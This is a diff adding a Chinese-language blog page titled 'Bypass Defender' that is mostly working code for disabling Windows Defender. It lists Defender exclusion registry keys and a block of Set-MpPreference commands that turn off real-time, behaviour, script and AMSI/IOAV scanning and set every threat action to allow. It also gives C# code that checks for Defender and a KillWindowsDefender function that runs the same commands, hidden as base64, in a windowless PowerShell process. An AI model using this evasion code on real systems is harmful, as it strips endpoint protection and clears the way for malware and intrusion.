@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple_touch_icon.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/apple_touch_icon.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"hide","padding":18,"offset":12,"onmobile":false,"dimmer":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="通过修改Defender扫描行为、扫描强度等设置来尽量降低Defender防护强度">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypass Defender">
+<meta property="og:url" content="http://example.com/2020/07/07/Bypass-Defender/index.html">
+<meta property="og:site_name" content="行云">
+<meta property="og:description" content="通过修改Defender扫描行为、扫描强度等设置来尽量降低Defender防护强度">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-07T15:51:22.000Z">
+<meta property="article:modified_time" content="2022-01-08T04:30:15.954Z">
+<meta property="article:author" content="行云">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2020/07/07/Bypass-Defender/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Bypass Defender | 行云</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">行云</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fas fa-users fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/07/07/Bypass-Defender/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="行云">
+      <meta itemprop="description" content="千里江山 任我飞渡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="行云">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Bypass Defender
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-07 23:51:22" itemprop="dateCreated datePublished" datetime="2020-07-07T23:51:22+08:00">2020-07-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Bypass/" itemprop="url" rel="index"><span itemprop="name">Bypass</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>通过修改<code>Defender</code>扫描行为、扫描强度等设置来尽量降低<code>Defender</code>防护强度</p>
+<h2 id="Defender白名单注册表键值"><a href="#Defender白名单注册表键值" class="headerlink" title="Defender白名单注册表键值"></a>Defender白名单注册表键值</h2><pre><code>在新一些的版本中有Tamper Protection所以就不行了
+</code></pre>
+<p>直接向白名单路径下添加值即可</p>
+<ul>
+<li>目录及文件：<code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</code></li>
+<li>后缀：<code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions</code></li>
+<li>进程：<code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes</code></li>
+</ul>
+<hr>
+<h2 id="降低Defender防护能力"><a href="#降低Defender防护能力" class="headerlink" title="降低Defender防护能力"></a>降低Defender防护能力</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span>	//禁用实时监控，执行了会在右下角有提示，不使用</span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableArchiveScanning</span> <span class="variable">$true</span>	//禁用存档扫描</span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableBehaviorMonitoring</span> <span class="variable">$true</span>	//禁用行为监控</span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableBlockAtFirstSeen</span> <span class="variable">$true</span></span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableIOAVProtection</span> <span class="variable">$true</span>	//禁用IOAV保护，禁用AMSI</span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-DisablePrivacyMode</span> <span class="variable">$true</span>	//禁用隐私模式</span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-SignatureDisableUpdateOnStartupWithoutEngine</span> <span class="variable">$true</span>	//没有引擎启动时签名禁用更新</span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableIntrusionPreventionSystem</span> <span class="variable">$true</span></span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableScriptScanning</span> <span class="variable">$true</span>	//禁用脚本扫描</span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-SubmitSamplesConsent</span> <span class="number">2</span></span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-MAPSReporting</span> <span class="number">0</span></span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-HighThreatDefaultAction</span> <span class="number">6</span> <span class="literal">-Force</span></span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-ModerateThreatDefaultAction</span> <span class="number">6</span></span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-LowThreatDefaultAction</span> <span class="number">6</span></span><br><span class="line">powershell <span class="built_in">Set-MpPreference</span> <span class="literal">-SevereThreatDefaultAction</span> <span class="number">6</span>	//严重威胁默认操作</span><br></pre></td></tr></table></figure>
+
+<h2 id="检测是否是Defender"><a href="#检测是否是Defender" class="headerlink" title="检测是否是Defender"></a>检测是否是Defender</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.Win32;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">isDefender</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> regPath = <span class="string">@&quot;SOFTWARE\Microsoft\Windows Defender&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.Default))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (key.GetValue(<span class="string">&quot;DisableAntiSpyware&quot;</span>).ToString() == <span class="string">&quot;1&quot;</span> | key.GetValue(<span class="string">&quot;DisableAntiVirus&quot;</span>).ToString() == <span class="string">&quot;1&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果没有安装过其他的杀软，那么是没有这两个键值的，也就是还用的defender</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="关闭Defender防护"><a href="#关闭Defender防护" class="headerlink" title="关闭Defender防护"></a>关闭Defender防护</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">KillWindowsDefender</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> pj = <span class="string">@&quot;UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgACQAdAByAHUAZQAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAUAByAGkAdgBhAGMAeQBNAG8AZABlACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0AUwBpAGcAbgBhAHQAdQByAGUARABpAHMAYQBiAGwAZQBVAHAAZABhAHQAZQBPAG4AUwB0AGEAcgB0AHUAcABXAGkAdABoAG8AdQB0AEUAbgBnAGkAbgBlACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBJAG4AdAByAHUAcwBpAG8AbgBQAHIAZQB2AGUAbgB0AGkAbwBuAFMAeQBzAHQAZQBtACAAJAB0AHIAdQBlACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBTAGMAcgBpAHAAdABTAGMAYQBuAG4AaQBuAGcAIAAkAHQAcgB1AGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBTAHUAYgBtAGkAdABTAGEAbQBwAGwAZQBzAEMAbwBuAHMAZQBuAHQAIAAyACwAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ATQBBAFAAUwBSAGUAcABvAHIAdABpAG4AZwAgADAALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBIAGkAZwBoAFQAaAByAGUAYQB0AEQAZQBmAGEAdQBsAHQAQQBjAHQAaQBvAG4AIAA2ACAALQBGAG8AcgBjAGUALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBNAG8AZABlAHIAYQB0AGUAVABoAHIAZQBhAHQARABlAGYAYQB1AGwAdABBAGMAdABpAG8AbgAgADYALABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBMAG8AdwBUAGgAcgBlAGEAdABEAGUAZgBhAHUAbAB0AEEAYwB0AGkAbwBuACAANgAsAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAFMAZQB2AGUAcgBlAFQAaAByAGUAYQB0AEQAZQBmAGEAdQBsAHQAQQBjAHQAaQBvAG4AIAA2AA==&quot;</span>;</span><br><span class="line">    pj = Encoding.Unicode.GetString(Convert.FromBase64String(pj));</span><br><span class="line">    <span class="comment">//Console.WriteLine(pj);</span></span><br><span class="line"></span><br><span class="line">    Process p = <span class="keyword">new</span> Process();</span><br><span class="line">    p.StartInfo.FileName = <span class="string">@&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span>;</span><br><span class="line">    p.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">    p.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">    p.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">    p.Start();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> i <span class="keyword">in</span> pj.Split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(i);</span><br><span class="line">        p.StandardInput.WriteLine(i);</span><br><span class="line">    &#125;</span><br><span class="line">    p.StandardInput.WriteLine(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">    p.Dispose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>关注公众号可以订阅最新相关文章</div>
+
+  <!--<button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>-->
+
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/Public-WeChat.jpg" alt="行云 微信支付">
+
+        <!-- 注释掉这一行打赏提示 -->
+        <!-- <p>微信支付</p> -->
+        
+      </div>
+
+  </div>
+
+  <!-- 直接显示微信二维码 -->
+  <script>
+    var qr = document.getElementById('qr');
+    qr.style.display = 'block';
+  </script>
+
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/14/DomainFronting-%E7%BB%95%E8%BF%87%E5%9F%9F%E5%90%8D%E6%A3%80%E6%B5%8B%E7%BB%91%E5%AE%9A%E9%9D%9E%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%BA%E6%88%BFIP/" rel="next" title="域前置绕过域名检测绑定非阿里云机房IP">
+      域前置绕过域名检测绑定非阿里云机房IP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Defender%E7%99%BD%E5%90%8D%E5%8D%95%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC"><span class="nav-number">1.</span> <span class="nav-text">Defender白名单注册表键值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%8D%E4%BD%8EDefender%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B"><span class="nav-number">2.</span> <span class="nav-text">降低Defender防护能力</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E6%98%AFDefender"><span class="nav-number">3.</span> <span class="nav-text">检测是否是Defender</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%97%ADDefender%E9%98%B2%E6%8A%A4"><span class="nav-number">4.</span> <span class="nav-text">关闭Defender防护</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="行云"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">行云</p>
+  <div class="site-description" itemprop="description">千里江山 任我飞渡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xingyun-cloud" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xingyun-cloud" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="far fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">行云</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
